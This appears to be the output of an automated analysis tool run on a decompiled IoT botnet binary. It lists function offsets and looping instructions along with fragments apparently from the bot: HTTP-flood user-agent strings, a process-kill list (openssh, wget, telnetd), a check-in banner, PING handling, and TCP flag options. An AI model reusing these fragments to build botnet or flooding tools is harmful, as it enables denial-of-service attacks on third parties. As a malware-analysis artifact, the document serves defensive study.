+        "AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
+        "AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
+        "AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
+        "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
+        "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
+        "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
+        "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
+        "MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
+        "Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)"
+        "openssh",
+        "wget",
+        "telnetd",
+=================FUNCTION : function_1000d684 ===================
+++++++++ FUNCTION START 29000
+++++++++ FUNCTION END 30038
+++++++++ FUNCTION LENGTH 1038
+        while (true) {
+                while (true) {
+                    while (true) {
+                                        while (true) {
+                                            while (true) {
+                                                while (true) {
+                                                                    while (true) {
+                                                                            while (true) {
+                                                                                        while (true) {
+                                                                                while (true) {
+                                                            while (true) {
+                                                                    while (true) {
+                                                                                while (true) {
+                                                                            while (true) {
+                                                while (true) {
+                                                    while (true) {
+                                                                    while (true) {
+                                                            while (true) {
+    while (true) {
+=================FUNCTION : function_1000b610 ===================
+++++++++ FUNCTION START 18902
+++++++++ FUNCTION END 19507
+++++++++ FUNCTION LENGTH 605
+        while (true) {
+                function_100017e4(v200, (int32_t)"[ %s CONNECTED ] [ %s: ] [ Arch Type: %s ]", v197);
+                while (true) {
+                    while (true) {
+                                        while (true) {
+                                                    while (true) {
+                            if (function_1000e1b0(v196, "PING", 0x10010000) == v196) {
+                            while (true) {
+                            while (true) {
+                            while (true) {
+                                            while (true) {
+                                                while (true) {
+                                                        while (true) {
+                                                while (true) {
+                                                while (true) {
+    while (true) {
+    while (true) {
+=================FUNCTION : function_10013d3c ===================
+++++++++ FUNCTION START 67714
+++++++++ FUNCTION END 68360
+++++++++ FUNCTION LENGTH 646
+            while (true) {
+                                    while (true) {
+        while (true) {
+                    while (true) {
+                            while (true) {
+                                        while (true) {
+                                        while (true) {
+                                while (true) {
+=================FUNCTION : function_10013360 ===================
+++++++++ FUNCTION START 65073
+++++++++ FUNCTION END 65665
+++++++++ FUNCTION LENGTH 592
+                                while (true) {
+                                while (true) {
+            while (true) {
+                while (true) {
+                                        while (true) {
+                                                        while (true) {
+                                                        while (true) {
+=================FUNCTION : function_10011f7c ===================
+++++++++ FUNCTION START 58662
+++++++++ FUNCTION END 59074
+++++++++ FUNCTION LENGTH 412
+    while (true) {
+            while (true) {
+                                while (true) {
+                                        while (true) {
+                                            while (true) {
+                                                while (true) {
+                                                while (true) {
+=================FUNCTION : function_1000e888 ===================
+++++++++ FUNCTION START 36937
+++++++++ FUNCTION END 37999
+++++++++ FUNCTION LENGTH 1062
+                                                    while (true) {
+                                                        while (true) {
+                                        while (true) {
+                                            while (true) {
+                                            while (true) {
+                                                while (true) {
+=================FUNCTION : function_10002564 ===================
+++++++++ FUNCTION START 9218
+++++++++ FUNCTION END 9541
+++++++++ FUNCTION LENGTH 323
+            while (true) {
+                function_100017e4(v196, (int32_t)"PING", 0x10010000);
+                while (true) {
+                        while (true) {
+                        while (true) {
+    while (true) {
+=================FUNCTION : function_1000e1b0 ===================
+++++++++ FUNCTION START 33015
+++++++++ FUNCTION END 33337
+++++++++ FUNCTION LENGTH 322
+    while (true) {
+    while (true) {
+                while (true) {
+    while (true) {
+    while (true) {
+=================FUNCTION : function_1000a030 ===================
+++++++++ FUNCTION START 14654
+++++++++ FUNCTION END 15077
+++++++++ FUNCTION LENGTH 423
+                    while (true) {
+                            if (function_1000df0c(v213, (int32_t)"rst") == 0) {
+                                        if (function_1000df0c(v213, (int32_t)"psh") == 0) {
+                    while (true) {
+            while (true) {
+=================FUNCTION : function_100021b8 ===================
+++++++++ FUNCTION START 8544
+++++++++ FUNCTION END 8799
+++++++++ FUNCTION LENGTH 255
+    int32_t v186 = function_1000c524((int32_t)"/proc/cpuinfo", 0); // 0x100021e0
+    while (true) {
+            while (true) {
+                            while (true) {
+=================FUNCTION : function_10011514 ===================
+++++++++ FUNCTION START 56163
+++++++++ FUNCTION END 56474
+++++++++ FUNCTION LENGTH 311
+        while (true) {
+        while (true) {
+        while (true) {
+    while (true) {
+=================FUNCTION : function_1000cc54 ===================
+++++++++ FUNCTION START 27084
+++++++++ FUNCTION END 27978
+++++++++ FUNCTION LENGTH 894
+    while (true) {
+        while (true) {
+                            while (true) {
+                                            while (true) {
+=================FUNCTION : function_100136cc ===================
+++++++++ FUNCTION START 65910
+++++++++ FUNCTION END 66474
+++++++++ FUNCTION LENGTH 564
+        while (true) {
+            while (true) {
+                while (true) {
+        while (true) {
+=================FUNCTION : function_10000cc8 ===================
+++++++++ FUNCTION START 4670
+++++++++ FUNCTION END 5292
+++++++++ FUNCTION LENGTH 622
+                while (true) {
+                while (true) {
+            while (true) {
+=================FUNCTION : function_10009df8 ===================
+++++++++ FUNCTION START 14389
+++++++++ FUNCTION END 14651
+++++++++ FUNCTION LENGTH 262
+    int32_t result = function_1000c868(v193, (int32_t)"%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n", a2, a4, v194, v195, 0x10020000, v191); // 0x1000a02c
+    while (true) {
+                while (true) {
+=================FUNCTION : function_1000e004 ===================
+++++++++ FUNCTION START 32422
+++++++++ FUNCTION END 32718
+++++++++ FUNCTION LENGTH 296
+        while (true) {
+        while (true) {
+        while (true) {
+=================FUNCTION : function_1000106c ===================
+++++++++ FUNCTION START 5597
+++++++++ FUNCTION END 6123
+++++++++ FUNCTION LENGTH 526
+    while (true) {
+                        while (true) {
+                            while (true) {
+=================FUNCTION : function_1000fa58 ===================
+++++++++ FUNCTION START 44212
+++++++++ FUNCTION END 44673
+++++++++ FUNCTION LENGTH 461
+    while (true) {
+                        while (true) {
+                while (true) {
+=================FUNCTION : function_100118e0 ===================
+++++++++ FUNCTION START 57704
+++++++++ FUNCTION END 58659
+++++++++ FUNCTION LENGTH 955
+                        while (true) {
+                            while (true) {
+                                                                            while (true) {
+=================FUNCTION : function_1000e0c0 ===================
+++++++++ FUNCTION START 32721
+++++++++ FUNCTION END 33012
+++++++++ FUNCTION LENGTH 291
+            while (true) {
+    while (true) {
+    while (true) {
+=================FUNCTION : function_10013114 ===================
+++++++++ FUNCTION START 64105
+++++++++ FUNCTION END 64386
+++++++++ FUNCTION LENGTH 281
+        while (true) {
+                while (true) {
+    while (true) {
+=================FUNCTION : function_10008b3c ===================
+++++++++ FUNCTION START 13846
+++++++++ FUNCTION END 14175
+++++++++ FUNCTION LENGTH 329
+    while (true) {
+        while (true) {
+        while (true) {
+=================FUNCTION : function_1000b2e0 ===================
+++++++++ FUNCTION START 18186
+++++++++ FUNCTION END 18517
+++++++++ FUNCTION LENGTH 331
+        int32_t v192 = function_1000c524((int32_t)"/proc/net/route", 0); // 0x1000b410
+        while (true) {
+=================FUNCTION : function_1000ca44 ===================
+++++++++ FUNCTION START 26177
+++++++++ FUNCTION END 26416
+++++++++ FUNCTION LENGTH 239
+        while (true) {
+    while (true) {
+=================FUNCTION : function_1000fca4 ===================
+++++++++ FUNCTION START 44876
+++++++++ FUNCTION END 45133
+++++++++ FUNCTION LENGTH 257
+    while (true) {
+    while (true) {
+=================FUNCTION : function_10013cd8 ===================
+++++++++ FUNCTION START 67514
+++++++++ FUNCTION END 67711
+++++++++ FUNCTION LENGTH 197
+    int32_t v186 = function_100126e8((int32_t)"/etc/hosts", (int32_t)&v185); // 0x10013cfc
+        result = function_100126e8((int32_t)"/etc/config/hosts", v187);
+=================FUNCTION : function_10010800 ===================
+++++++++ FUNCTION START 49914
+++++++++ FUNCTION END 50194
+++++++++ FUNCTION LENGTH 280
+    while (true) {
+            while (true) {
+=================FUNCTION : function_1000de0c ===================
+++++++++ FUNCTION START 31430
+++++++++ FUNCTION END 31727
+++++++++ FUNCTION LENGTH 297
+        while (true) {
+    while (true) {
+=================FUNCTION : function_10000aec ===================
+++++++++ FUNCTION START 4214
+++++++++ FUNCTION END 4464
+++++++++ FUNCTION LENGTH 250
+    while (true) {
+            while (true) {
+=================FUNCTION : function_10002f74 ===================
+++++++++ FUNCTION START 10482
+++++++++ FUNCTION END 10739
+++++++++ FUNCTION LENGTH 257
+    while (true) {
+        while (true) {
+=================FUNCTION : function_10011820 ===================
+++++++++ FUNCTION START 57425
+++++++++ FUNCTION END 57701
+++++++++ FUNCTION LENGTH 276
+    while (true) {
+        while (true) {
+=================FUNCTION : function_10003118 ===================
+++++++++ FUNCTION START 10742
+++++++++ FUNCTION END 11041
+++++++++ FUNCTION LENGTH 299
+        while (true) {
+            while (true) {
+=================FUNCTION : function_10010c00 ===================
+++++++++ FUNCTION START 51275
+++++++++ FUNCTION END 51582
+++++++++ FUNCTION LENGTH 307
+        while (true) {
+    while (true) {
+=================FUNCTION : function_10011650 ===================
+++++++++ FUNCTION START 56669
+++++++++ FUNCTION END 56979
+++++++++ FUNCTION LENGTH 310
+        while (true) {
+        while (true) {
+=================FUNCTION : function_10012de8 ===================
+++++++++ FUNCTION START 63226
+++++++++ FUNCTION END 63537
+++++++++ FUNCTION LENGTH 311
+            while (true) {
+    while (true) {
+=================FUNCTION : function_100117e4 ===================
+++++++++ FUNCTION START 57197
+++++++++ FUNCTION END 57422
+++++++++ FUNCTION LENGTH 225
+    while (true) {
+        while (true) {
+=================FUNCTION : function_100023d0 ===================
+++++++++ FUNCTION START 8802
+++++++++ FUNCTION END 9013
+++++++++ FUNCTION LENGTH 211
+    int32_t v186 = function_1000c524((int32_t)"/proc/cpuinfo", 0); // 0x100023fc
+    while (true) {
+=================FUNCTION : function_1000df60 ===================
+++++++++ FUNCTION START 32147
+++++++++ FUNCTION END 32419
+++++++++ FUNCTION LENGTH 272
+        while (true) {
+    while (true) {
+=================FUNCTION : function_10014470 ===================
+++++++++ FUNCTION START 70082
+++++++++ FUNCTION END 70297
+++++++++ FUNCTION LENGTH 215
+    while (true) {
+=================FUNCTION : function_1000c228 ===================
+++++++++ FUNCTION START 20385
+++++++++ FUNCTION END 20583
+++++++++ FUNCTION LENGTH 198
+    while (true) {
+=================FUNCTION : function_1000e750 ===================
+++++++++ FUNCTION START 36142
+++++++++ FUNCTION END 36352
+++++++++ FUNCTION LENGTH 210
+    while (true) {
+=================FUNCTION : function_1000d3d4 ===================
+++++++++ FUNCTION START 28420
+++++++++ FUNCTION END 28796
+++++++++ FUNCTION LENGTH 376
+            while (true) {
+=================FUNCTION : function_1000cb54 ===================
+++++++++ FUNCTION START 26623
+++++++++ FUNCTION END 26837
+++++++++ FUNCTION LENGTH 214
+    while (true) {
+=================FUNCTION : function_10013280 ===================
+++++++++ FUNCTION START 64815
+++++++++ FUNCTION END 65070
+++++++++ FUNCTION LENGTH 255
+    while (true) {
+=================FUNCTION : function_10001d64 ===================
+++++++++ FUNCTION START 7453
+++++++++ FUNCTION END 7666
+++++++++ FUNCTION LENGTH 213
+    while (true) {
+=================FUNCTION : function_1000a62c ===================
+++++++++ FUNCTION START 15080
+++++++++ FUNCTION END 15300
+++++++++ FUNCTION LENGTH 220
+    while (true) {
+=================FUNCTION : function_10012f98 ===================
+++++++++ FUNCTION START 63540
+++++++++ FUNCTION END 63828
+++++++++ FUNCTION LENGTH 288
+            while (true) {
+=================FUNCTION : function_10002878 ===================
+++++++++ FUNCTION START 9544
+++++++++ FUNCTION END 9755
+++++++++ FUNCTION LENGTH 211
+        function_1000e6c4("gethostbyname", 0x10010000);
+=================FUNCTION : function_10001bc4 ===================
+++++++++ FUNCTION START 7211
+++++++++ FUNCTION END 7450
+++++++++ FUNCTION LENGTH 239
+    while (true) {
+=================FUNCTION : function_100005c0 ===================
+++++++++ FUNCTION START 2418
+++++++++ FUNCTION END 2639
+++++++++ FUNCTION LENGTH 221
+        while (true) {
+=================FUNCTION : function_10012cc8 ===================
+++++++++ FUNCTION START 62967
+++++++++ FUNCTION END 63223
+++++++++ FUNCTION LENGTH 256
+                while (true) {
+=================FUNCTION : function_1001437c ===================
+++++++++ FUNCTION START 69793
+++++++++ FUNCTION END 70079
+++++++++ FUNCTION LENGTH 286
+    while (true) {
+=================FUNCTION : function_1000f1b8 ===================
+++++++++ FUNCTION START 41270
+++++++++ FUNCTION END 41523
+++++++++ FUNCTION LENGTH 253
+    while (true) {
+=================FUNCTION : function_10000e6c ===================
+++++++++ FUNCTION START 5295
+++++++++ FUNCTION END 5594
+++++++++ FUNCTION LENGTH 299
+            while (true) {
+=================FUNCTION : function_100106b4 ===================
+++++++++ FUNCTION START 49425
+++++++++ FUNCTION END 49718
+++++++++ FUNCTION LENGTH 293
+            while (true) {
+=================FUNCTION : function_1000296c ===================
+++++++++ FUNCTION START 9758
+++++++++ FUNCTION END 10013
+++++++++ FUNCTION LENGTH 255
+        while (true) {
+=================FUNCTION : function_10002bfc ===================
+++++++++ FUNCTION START 10016
+++++++++ FUNCTION END 10236
+++++++++ FUNCTION LENGTH 220
+    while (true) {
+=================FUNCTION : function_1001305c ===================
+++++++++ FUNCTION START 63831
+++++++++ FUNCTION END 64102
+++++++++ FUNCTION LENGTH 271
+    while (true) {
+=================FUNCTION : function_1000e2d4 ===================
+++++++++ FUNCTION START 33533
+++++++++ FUNCTION END 33812
+++++++++ FUNCTION LENGTH 279
+        while (true) {
+=================FUNCTION : function_100131e4 ===================
+++++++++ FUNCTION START 64389
+++++++++ FUNCTION END 64612
+++++++++ FUNCTION LENGTH 223
+    while (true) {
+=================FUNCTION : function_1000e3f0 ===================
+++++++++ FUNCTION START 34006
+++++++++ FUNCTION END 34224
+++++++++ FUNCTION LENGTH 218
+    while (true) {
+=================FUNCTION : function_1001356c ===================
+++++++++ FUNCTION START 65668
+++++++++ FUNCTION END 65907
+++++++++ FUNCTION LENGTH 239
+    while (true) {
+=================FUNCTION : function_1000df0c ===================
+++++++++ FUNCTION START 31730
+++++++++ FUNCTION END 31940
+++++++++ FUNCTION LENGTH 210
+    while (true) {
+=================FUNCTION : function_100142b0 ===================
+++++++++ FUNCTION START 69521
+++++++++ FUNCTION END 69790
+++++++++ FUNCTION LENGTH 269
+    while (true) {
+=================FUNCTION : function_10001e4c ===================
+++++++++ FUNCTION START 7669
+++++++++ FUNCTION END 7884
+++++++++ FUNCTION LENGTH 215
+    while (true) {
+=================FUNCTION : function_1000d2bc ===================
+++++++++ FUNCTION START 27981
+++++++++ FUNCTION END 28216
+++++++++ FUNCTION LENGTH 235
+    while (true) {
+=================FUNCTION : function_1000f738 ===================
+++++++++ FUNCTION START 43479
+++++++++ FUNCTION END 43755
+++++++++ FUNCTION LENGTH 276
+                while (true) {
+=================FUNCTION : function_10009ce8 ===================
+++++++++ FUNCTION START 14178
+++++++++ FUNCTION END 14386
+++++++++ FUNCTION LENGTH 208
+    while (true) {
+=================FUNCTION : function_100007b4 ===================
+++++++++ FUNCTION START 3221
+++++++++ FUNCTION END 3432
+++++++++ FUNCTION LENGTH 211
+    while (true) {
+=================FUNCTION : function_10014260 ===================
+++++++++ FUNCTION START 69290
+++++++++ FUNCTION END 69518
+++++++++ FUNCTION LENGTH 228
+    while (true) {
+=================FUNCTION : function_1001012c ===================
+++++++++ FUNCTION START 46630
+++++++++ FUNCTION END 46995
+++++++++ FUNCTION LENGTH 365
+    while (true) {
+=================FUNCTION : function_1000f2a0 ===================
+++++++++ FUNCTION START 41922
+++++++++ FUNCTION END 42241
+++++++++ FUNCTION LENGTH 319
+    while (true) {
+================================================================================
+========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
+================================================================================
+=============================WHILE LOOPS ID : 3 @ function_10000aec ====================================
+++++++++ WHILE START : 4403 
+++++++++ WHILE FUNCTION : function_10000aec 
+++++++++ WHILE END : 4463 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 8 @ function_1000106c ====================================
+++++++++ WHILE START : 5800 
+++++++++ WHILE FUNCTION : function_1000106c 
+++++++++ WHILE END : 6115 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 12 @ function_100021b8 ====================================
+++++++++ WHILE START : 8734 
+++++++++ WHILE FUNCTION : function_100021b8 
+++++++++ WHILE END : 8798 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 14 @ function_10002564 ====================================
+++++++++ WHILE START : 9427 
+++++++++ WHILE FUNCTION : function_10002564 
+++++++++ WHILE END : 9521 
+++++++++ INTRESTING INSTRUCTIONS :  
+		function_100017e4(v196, (int32_t)"PING", 0x10010000);
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 18 @ function_10002f74 ====================================
+++++++++ WHILE START : 10677 
+++++++++ WHILE FUNCTION : function_10002f74 
+++++++++ WHILE END : 10738 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 19 @ function_10003118 ====================================
+++++++++ WHILE START : 10936 
+++++++++ WHILE FUNCTION : function_10003118 
+++++++++ WHILE END : 11035 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 20 @ function_10008b3c ====================================
+++++++++ WHILE START : 14045 
+++++++++ WHILE FUNCTION : function_10008b3c 
+++++++++ WHILE END : 14174 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 22 @ function_10009df8 ====================================
+++++++++ WHILE START : 14593 
+++++++++ WHILE FUNCTION : function_10009df8 
+++++++++ WHILE END : 14648 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 23 @ function_1000a030 ====================================
+++++++++ WHILE START : 14901 
+++++++++ WHILE FUNCTION : function_1000a030 
+++++++++ WHILE END : 14972 
+++++++++ INTRESTING INSTRUCTIONS :  
+		if (function_1000df0c(v213, (int32_t)"rst") == 0) {
+		if (function_1000df0c(v213, (int32_t)"psh") == 0) {
+=============================WHILE LOOPS ID : 31 @ function_1000a77c ====================================
+++++++++ WHILE START : 15796 
+++++++++ WHILE FUNCTION : function_1000a77c 
+++++++++ WHILE END : 15837 
+++++++++ INTRESTING INSTRUCTIONS :  
+		result5 = function_1000df0c((char *)*a2, (int32_t)"URSTRAITKANCER");
+=============================WHILE LOOPS ID : 91 @ function_1000b610 ====================================
+++++++++ WHILE START : 19124 
+++++++++ WHILE FUNCTION : function_1000b610 
+++++++++ WHILE END : 19461 
+++++++++ INTRESTING INSTRUCTIONS :  
+		function_100017e4(v200, (int32_t)"[ %s CONNECTED ] [ %s: ] [ Arch Type: %s ]", v197);
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		if (function_1000e1b0(v196, "PING", 0x10010000) == v196) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 98 @ function_1000cc54 ====================================
+++++++++ WHILE START : 27296 
+++++++++ WHILE FUNCTION : function_1000cc54 
+++++++++ WHILE END : 27977 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 101 @ function_1000d684 ====================================
+++++++++ WHILE START : 29205 
+++++++++ WHILE FUNCTION : function_1000d684 
+++++++++ WHILE END : 30022 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 115 @ function_1000e1b0 ====================================
+++++++++ WHILE START : 33235 
+++++++++ WHILE FUNCTION : function_1000e1b0 
+++++++++ WHILE END : 33297 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 130 @ function_1000fa58 ====================================
+++++++++ WHILE START : 44403 
+++++++++ WHILE FUNCTION : function_1000fa58 
+++++++++ WHILE END : 44672 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 135 @ function_10010800 ====================================
+++++++++ WHILE START : 50108 
+++++++++ WHILE FUNCTION : function_10010800 
+++++++++ WHILE END : 50189 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 138 @ function_10010cfc ====================================
+++++++++ WHILE START : 51819 
+++++++++ WHILE FUNCTION : function_10010cfc 
+++++++++ WHILE END : 55505 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 146 @ function_100117e4 ====================================
+++++++++ WHILE START : 57391 
+++++++++ WHILE FUNCTION : function_100117e4 
+++++++++ WHILE END : 57421 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 147 @ function_10011820 ====================================
+++++++++ WHILE START : 57621 
+++++++++ WHILE FUNCTION : function_10011820 
+++++++++ WHILE END : 57694 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 148 @ function_100118e0 ====================================
+++++++++ WHILE START : 57922 
+++++++++ WHILE FUNCTION : function_100118e0 
+++++++++ WHILE END : 58553 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 149 @ function_10011f7c ====================================
+++++++++ WHILE START : 58874 
+++++++++ WHILE FUNCTION : function_10011f7c 
+++++++++ WHILE END : 59073 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 155 @ function_10013114 ====================================
+++++++++ WHILE START : 64314 
+++++++++ WHILE FUNCTION : function_10013114 
+++++++++ WHILE END : 64363 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 161 @ function_10013360 ====================================
+++++++++ WHILE START : 65410 
+++++++++ WHILE FUNCTION : function_10013360 
+++++++++ WHILE END : 65655 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
+=============================WHILE LOOPS ID : 169 @ function_10013d3c ====================================
+++++++++ WHILE START : 68049 
+++++++++ WHILE FUNCTION : function_10013d3c 
+++++++++ WHILE END : 68281 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		while (true) {
